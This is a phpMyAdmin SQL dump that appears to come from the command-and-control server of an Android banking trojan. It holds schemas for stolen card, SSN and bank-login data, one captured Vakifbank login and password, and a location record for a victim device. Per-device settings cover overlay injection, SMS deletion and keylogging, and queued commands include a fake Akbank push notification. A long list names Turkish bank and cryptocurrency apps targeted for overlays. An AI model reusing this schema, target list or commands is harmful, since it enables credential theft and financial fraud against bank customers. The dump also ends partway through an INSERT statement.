-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 28 Tem 2020, 22:41:29
-- Sunucu sürümü: 10.2.19-MariaDB-cll-lve
-- PHP Sürümü: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `beryus_one`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `cc`
--

CREATE TABLE `cc` (
  `id` int(255) UNSIGNED NOT NULL,
  `imei` varchar(20) NOT NULL,
  `country` varchar(10) NOT NULL,
  `typecard` varchar(20) DEFAULT NULL,
  `numbercard` varchar(30) NOT NULL,
  `monthyear` varchar(20) DEFAULT NULL,
  `cvc` varchar(20) DEFAULT NULL,
  `nameholder` varchar(50) DEFAULT NULL,
  `databirth` varchar(50) DEFAULT NULL,
  `postalcode` varchar(20) DEFAULT NULL,
  `addressholder` varchar(100) DEFAULT NULL,
  `phonenumber` varchar(50) DEFAULT NULL,
  `ssn` varchar(50) DEFAULT NULL,
  `accountnumber` varchar(50) DEFAULT NULL,
  `vbv` varchar(20) DEFAULT NULL,
  `SortCode` varchar(20) DEFAULT NULL,
  `timeaddcc` varchar(30) DEFAULT NULL,
  `comments` varchar(3000) DEFAULT NULL,
  `bin` varchar(500) DEFAULT NULL,
  `vbv2` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `commands`
--

CREATE TABLE `commands` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `commands`
--

INSERT INTO `commands` (`id`, `IMEI`, `command`) VALUES
(13, 'b54dd02a2a734203', '|command=PUSH|title=Akbank|text=Hesabınıza para Geldi|icon=tr_akbank::'),
(14, 'b54dd02a2a734203', 'startAutoPush|AppName=tr_pozitron.iscep|EndAppName::');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `duplicate_commands`
--

CREATE TABLE `duplicate_commands` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `idbotwindows`
--

CREATE TABLE `idbotwindows` (
  `id` int(255) NOT NULL,
  `idbot` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `injection`
--

CREATE TABLE `injection` (
  `id` int(60) UNSIGNED NOT NULL,
  `name` varchar(500) NOT NULL,
  `process` varchar(500) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `injection`
--

INSERT INTO `injection` (`id`, `name`, `process`) VALUES
(734, '(TR)com.akbank.android.apps.akbank_direkt', 'tr_akbank,com.akbank.android.apps.akbank_direkt,com.akbank.android.apps.akbank_direkt_tablet,com.akbank.softotp,com.mobilike.cepbutcem,akbank.yatirimci.mobile'),
(735, '(TR)com.finansbank.mobile.cepsube', 'tr_qnb_finansbank,com.finansbank.mobile.cepsube,finansbank.enpara,com.magiclick.FinansPOS,com.matriksdata.finansyatirim,finansbank.enpara.sirketim,com.vipera.ts.starter.QNB,com.QNBAlAhli,com.qnbbank.mobile'),
(736, '(TR)com.garanti.cepsubesi', 'tr_garantibank,com.garanti.cepsubesi,com.garanti.cepbank,com.garantibank.cepsubesiro,biz.mobinex.android.apps.cep_sifrematik,com.garantiemeklilik.cepsube,garanti.etrader'),
(737, '(TR)com.tmobtech.halkbank', 'tr_halkbank,com.tmobtech.halkbank,com.SifrebazCep,eu.newfrontier.iBanking.mobile.Halk.Retail,rs.telnet.cacanskabankadroid,halkcorporate.mk'),
(738, '(TR)com.softtech.isbankasi', 'tr_isbank,com.softtech.isbankasi,com.yurtdisi.iscep,com.softtech.iscek,com.monitise.isbankmoscow'),
(739, '(TR)com.ykb.android', 'tr_yapikredi,com.ykb.android,com.ykb.android.mobilonay,com.ykb.avm,com.ykb.androidtablet,com.veripark.ykbaz'),
(740, '(TR)com.ziraat.ziraatmobil', 'tr_ziraatbanksi,com.ziraat.ziraatmobil,com.ziraat.ziraattablet,com.matriksmobile.android.ziraatTrader'),
(741, '(TR)com.pozitron.iscep', 'tr_pozitron.iscep,com.pozitron.iscep'),
(742, '(TR)com.vakifbank.mobile', 'tr_vakifbank,com.vakifbank.mobile,com.pozitron.vakifbank'),
(743, '(TR)com.btcturk', 'tr_com.btcturk,com.btcturk'),
(744, '(TR)com.finansbank.mobile.cepsube', 'tr_com.finansbank.mobile.cepsube,com.finansbank.mobile.cepsube'),
(745, '(TR)com.ingbanktr.ingmobil', 'tr_com.ingbanktr.ingmobil,com.ingbanktr.ingmobil'),
(746, '(TR)com.kuveytturk.mobil', 'tr_com.kuveytturk.mobil,com.kuveytturk.mobil'),
(747, '(TR)com.magiclick.odeabank', 'tr_com.magiclick.odeabank,com.magiclick.odeabank'),
(748, '(TR)com.mobillium.papara', 'tr_com.mobillium.papara,com.mobillium.papara'),
(749, '(TR)com.pozitron.albarakaturk', 'tr_com.pozitron.albarakaturk,com.pozitron.albarakaturk'),
(750, '(TR)com.teb', 'tr_com.teb,com.teb'),
(751, '(TR)com.tmob.denizbank', 'tr_com.tmob.denizbank,com.tmob.denizbank'),
(753, '(TR)finansbank.enpara', 'tr_finansbank.enpara,finansbank.enpara'),
(754, '(TR)tr.com.hsbc.hsbcturkey', 'tr_tr.com.hsbc.hsbcturkey,tr.com.hsbc.hsbcturkey'),
(755, '(TR)tr.com.sekerbilisim.mbank', 'tr_tr.com.sekerbilisim.mbank,tr.com.sekerbilisim.mbank'),
(1150, '(Crypt)piuk.blockchain.android', 'blockchaine,piuk.blockchain.android,info.blockchain.merchant'),
(1151, '(Crypt)com.coinbase.android', 'com.coinbase.android,com.coinbase.android,com.portfolio.coinbase_tracker'),
(1152, '(Crypt)com.unocoin.unocoinwallet', 'com.unocoin.unocoinwallet,com.unocoin.unocoinwallet,com.unocoin.unocoinmerchantPoS'),
(1153, '(Crypt)com.localbitcoinsmbapp', 'localbitcoin,com.localbitcoinsmbapp,com.thunkable.android.manirana54.LocalBitCoins,com.thunkable.android.manirana54.LocalBitCoins_unblock,com.localbitcoins.exchange,com.coins.bit.local,com.coins.ful.bit,com.jamalabbasii1998.localbitcoin'),
(1154, '(Crypt)zebpay.Application', 'zebpay,zebpay.Application'),
(1155, '(Crypt)com.binance.dev', 'tr_com.binance.dev,com.binance.dev'),
(1156, '(Crypt)com.bitfinex.bfxapp', 'com.bitfinex.bfxapp,com.bitfinex.bfxapp'),
(1157, '(Crypt)com.mycelium.wallet', 'com.mycelium.wallet,com.mycelium.wallet'),
(1158, '(Crypt)com.bitmarket.trader', 'com.bitmarket.trader,com.bitmarket.trader'),
(1159, '(Crypt)com.plunien.poloniex', 'com.plunien.poloniex,com.plunien.poloniex'),
(1160, '(Crypt)com.Plus500', 'com.Plus500,com.Plus500');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `injs`
--

CREATE TABLE `injs` (
  `id` int(255) NOT NULL,
  `idbot` varchar(200) NOT NULL,
  `name` varchar(300) NOT NULL,
  `country` varchar(10) DEFAULT NULL,
  `login` varchar(300) DEFAULT NULL,
  `password` varchar(300) DEFAULT NULL,
  `pin` varchar(300) DEFAULT NULL,
  `comments` varchar(2500) DEFAULT NULL,
  `params1` varchar(100) DEFAULT NULL,
  `params2` varchar(100) DEFAULT NULL,
  `vopros1` varchar(100) DEFAULT NULL,
  `vopros2` varchar(100) DEFAULT NULL,
  `otvet1` varchar(100) DEFAULT NULL,
  `cc` varchar(50) DEFAULT NULL,
  `monthyear` varchar(50) DEFAULT NULL,
  `cvv` varchar(5) DEFAULT NULL,
  `otvet2` varchar(100) DEFAULT NULL,
  `f_name` varchar(100) DEFAULT NULL,
  `l_name` varchar(100) DEFAULT NULL,
  `phone` varchar(35) DEFAULT NULL,
  `dateBrith` varchar(15) DEFAULT NULL,
  `logs` varchar(3000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `injs`
--

INSERT INTO `injs` (`id`, `idbot`, `name`, `country`, `login`, `password`, `pin`, `comments`, `params1`, `params2`, `vopros1`, `vopros2`, `otvet1`, `cc`, `monthyear`, `cvv`, `otvet2`, `f_name`, `l_name`, `phone`, `dateBrith`, `logs`) VALUES
(1, 'e42b5671dc21250c', 'vakifbank', 'tr', '23651382546', 'asdw1234', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `kliets`
--

CREATE TABLE `kliets` (
  `id` int(255) UNSIGNED NOT NULL,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(500) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` varchar(20) DEFAULT NULL,
  `color` varchar(20) DEFAULT NULL,
  `av` varchar(500) DEFAULT NULL,
  `requestInjProc` int(5) DEFAULT NULL,
  `requestGeoloc` int(5) DEFAULT NULL,
  `requestSMS` int(5) DEFAULT NULL,
  `seconds` varchar(50) DEFAULT NULL,
  `accessibility` varchar(5) DEFAULT NULL,
  `playprotect` varchar(10) DEFAULT NULL,
  `doze` varchar(10) DEFAULT NULL,
  `ip` varchar(20) DEFAULT NULL,
  `step` varchar(500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `markers`
--

CREATE TABLE `markers` (
  `id` int(11) NOT NULL,
  `name` varchar(60) NOT NULL,
  `lat` float(10,6) NOT NULL,
  `lng` float(10,6) NOT NULL,
  `type` varchar(30) NOT NULL,
  `provayder` varchar(30) DEFAULT NULL,
  `time` varchar(30) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `markers`
--

INSERT INTO `markers` (`id`, `name`, `lat`, `lng`, `type`, `provayder`, `time`) VALUES
(202, '3d9c25941236b620', 39.809200, 35.288101, 'K', 'NETWORK', '2020-04-18 00:45');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `settings`
--

CREATE TABLE `settings` (
  `id` int(60) UNSIGNED NOT NULL,
  `IMEI` varchar(1000) NOT NULL,
  `inject` varchar(3000) DEFAULT NULL,
  `del_sms` varchar(3000) DEFAULT NULL,
  `state` varchar(5) DEFAULT NULL,
  `avtootvet_num` varchar(50) DEFAULT NULL,
  `avtootvet_sig1` varchar(3000) DEFAULT NULL,
  `avtootvet_sig2` varchar(3000) DEFAULT NULL,
  `avtootvet_true` varchar(5) DEFAULT NULL,
  `checkforeground` varchar(10) DEFAULT NULL,
  `keylogger` varchar(10) DEFAULT NULL,
  `checkrecord` varchar(10) DEFAULT NULL,
  `recordseconds` varchar(50) DEFAULT NULL,
  `lookscreen` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `settings`
--

INSERT INTO `settings` (`id`, `IMEI`, `inject`, `del_sms`, `state`, `avtootvet_num`, `avtootvet_sig1`, `avtootvet_sig2`, `avtootvet_true`, `checkforeground`, `keylogger`, `checkrecord`, `recordseconds`, `lookscreen`) VALUES
(1, '843cf5657a5fb640', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(2, 'b2ccf2e0acdbff9f', '//741/748/748', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(3, '509d5bf4db9cfca0', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(4, '1e277c2db79b56b8', '//740', '1', '0', '', '0', '0', '1', '0', '1', '0', '', '0'),
(5, '7b1f49700efeb022', '', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(6, '910a260769ad2b81', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(7, 'a0ffc466983a3011', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(8, '8ee0c4f5c43d631c', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(9, '5bee7ea3232e90a7', '/736/740/741/742/742', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(10, '92368ad91189a0ad', '/', '1', '0', '', '0', '0', '1', '0', '0', '0', '', '0'),
(11, '73b13bb37982b6ba', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(12, '91781f48569c3c1b', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(13, '63a82bfb00656862', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(14, '6784326cf6cb56e2', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(15, 'a03bbb7084859bd9', '', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(16, '82f84dd43f0470d', '/736', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(17, '9a8b7f7207602c7b', '', '1', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(18, 'ef1b986cec546a9e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(19, '449a4634db9ce5a2', '/', '1', '0', '', '1', '0', '1', '0', '1', '0', '', ''),
(20, '3239559adc033572', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(21, '39d5dec5fbd2bd16', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(22, '8cc9f3f50301000e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(23, 'e15e71f364b31534', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(24, '80480a7e96b390b6', '', '1', '1', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(25, '6e04e6d5cd42e0f5', '/740', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(26, '578f59913bc13bf7', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(27, '564beb81263ac71f', '/740/750/750', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(28, '782624b30103c22e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(29, 'fd41d6c42c8c7ac2', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(30, '7e00a9a73f8c434b', '/739/739/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(31, '7a564613a77c5596', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(32, '69665c07be728c3a', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(33, 'fae507316aee8ee3', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(34, 'c96f24b8e1840264', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(35, '49d02404913b52bb', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(36, '33d11414c93df271', '', '1', '0', '', '0', '0', '1', '0', '1', '0', '', ''),
(37, '3e178cefbf13e3b8', '/736/739/739/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(38, '1569af6d4bedb2e7', '/741', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(39, 'dcc5eb8cbdbb2c96', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(40, 'c7b41024083a0dce', '', '', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(41, '730d5f23a3b8d969', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(42, '8dda4f18a7a5d258', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(43, 'f39dbafd17c092b7', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(44, '98e32e69bcda35dc', '', '1', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(45, 'd777d1afe81296bd', '/736', '', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(46, '370cc9c5eb02eb67', '', '', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(47, '8811f48e1fb0d437', '', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(48, 'b7ed214ae88733c4', '/736/740', '1', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(49, '020d1366710d1df0', '', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(50, 'ae06c9a75a256fc9', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(51, 'bb1ec5a28010af9a', '', '1', '1', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(52, '196e433743f8b426', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(53, '5ad6997d8e9ea3a9', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(54, '0ad905fa30b35f73', '/736/737/740/741', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(55, '945bb03a2375b8', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(56, 'c0571748c9589733', '/', '1', '0', '', '1', '0', '1', '0', '0', '0', '', '0'),
(57, 'f1e0b8d1e291d8f0', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(58, 'd8e5517bb4d86991', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(59, '58d16c4a4d9bb13d', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(60, '7fe1f732dd9d552d', '/740/741/745/750/750', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(61, 'ed73334f2f680c51', '/736', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(62, 'dbbd19ce9e842939', '/736/740/742/742', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(63, '66d7ff9357a19384', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(64, '578899d501865468', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(65, '931076d9fd14be0b', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(66, 'd4ecfd1735c8b6bf', '/740', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(67, '3c8c15cb20b7ed3e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(68, '4f68f409356d1a84', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(69, '926820336ec0a932', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(70, '63abad7f6c63de1f', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(71, '1511a5716c0bc786', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(72, '83f3fabadb87db8d', '/735/735/736/744/753', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(73, 'b2013f5eb229a870', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(74, '3d9c25941236b620', '/', '1', '0', '', '1', '0', '1', '0', '0', '0', '', '0'),
(75, 'fbf79059707d332b', '/735/735/744/744', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(76, '914afb16c6647207', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(77, '98c82383b1bfc273', '', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(78, '6afebc4808d084b9', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(79, '98340de1d5b09143', '/740', '', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(80, '783eb909cd137870', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(81, '224e5021a12c2c2c', '/740', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(82, '3f7dde52eb63d908', '/736/739/739', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(83, '57ee51ca7444c828', '/736', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(84, '819e246468f36fc6', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(85, 'ff8d84e3c4d3623c', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(86, '9ec04633a330addd', '/750/750', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(87, 'd7980ec5e97b12fa', '', '', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(88, '4c78d743078874f1', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(89, '5565a5ed28887eb2', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(90, '595477333586345', '', '1', '1', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(91, '7803d95c509765c0', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(92, '20d12a4adfcce05b', '/739/739/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(93, '6192e1717f406afa', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(94, '570d1bab35c5861b', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(95, 'c008fefa09efaab9', '/736/742/742', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(96, '4c2f8ee878961232', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(97, '47e8fe6cf98b74b6', '', '1', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(98, '0c0c9fd47d26d0d5', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(99, '8879490484ba97c6', '/746/746', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(100, '3e9acc8a4839dccd', '', '1', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(101, '1c74955be3371ece', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(102, '84f5864205393c27', '/740', '', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(103, '857b3242cd3c86df', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(104, '20b762c8094d8af3', '', '', '1', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(105, '54c1d659d28ce958', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(106, '5bb9c152fe58e274', '/740', '', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(107, '17a233de451502b5', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(108, '04f24282c05067a6', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(109, 'e5560806f7d950b8', '', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(110, '5a4e554de33c44f8', '/735/735/736/739/739/739/741/744/753', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(111, '1c54a156800722c0', '/740', '', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(112, '4f07db5d56a9efd3', '/736/740', '1', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(113, 'd524909a582df88e', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(114, 'feef77d24cebe145', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(115, '3eb51224be425ec', '/734', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(116, 'e5039b217707610e', '', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(117, '15c9f709b2f04d15', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(118, '3fae8ae6a81cd29c', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(119, '0d151858a8c2116e', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(120, 'a4b079de5f2d1731', '/735/735/736/744/744', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(121, '6f409b58602e253f', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(122, 'c5faa8744c7feefd', '/739/739', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(123, 'd400dc0b6d3d0e6e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(124, 'c542e04ce8bc6d75', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(125, '11bed034d4feb4a4', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(126, '80ebf4a3178ef193', '/735/735/741/744/744', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(127, '72c7a8fa2d660925', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(128, '2086c5f8a796dc35', '', '', '0', NULL, '0', '0', '', NULL, NULL, NULL, NULL, NULL),
(129, '708d15e941f7438e', '/735/735/744/744', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(130, 'b02e3eab736b3222', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(131, '8d5e92e85369fa3e', '/740', '', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(132, '78edf98aef326ef6', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(133, '525ea52d1ed21502', '', '', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(134, '71c042096adebf17', '', '', '0', NULL, '', '', '', NULL, NULL, NULL, NULL, NULL),
(135, '034849f51db0b38e', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(136, '380f6bdc3ba7e6ff', '/736', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(137, '85e7925ea3a9f157', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(138, '2759eef3eaf4fb0e', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(139, 'bc8e2d828c6484e5', '/', '1', '0', '', '0', '0', '1', '0', '0', '0', '', ''),
(140, 'd189e76512b1ad82', '/735/735/742/742/744/753', '1', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(141, 'd07d7a8f8a85f279', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(142, 'abcba23770849d67', '', '', '0', NULL, '', '', '1', NULL, NULL, NULL, NULL, NULL),
(143, '2c7d7946186eea79', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(144, 'f818777b85d699f4', '', '1', '1', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(145, 'f50f9ae1b9417316', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(146, 'dc3fb34a82d81593', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(147, '94112c7bf383d593', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(148, '10bf1a1202673eb3', '/734/735/735/735/735/736/737/739/739/740/741/742/744/744/744/745/746/746/747/747/748/748/750/750/753', '1', '0', '', '0', '0', '1', '0', '0', '0', '', '0'),
(149, 'e214ad5981bfb9fa', '//739/741/748', '0', '0', '', '0', '0', '1', '0', '0', '0', '', '0'),
(150, 'd89d29d0efbd911b', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
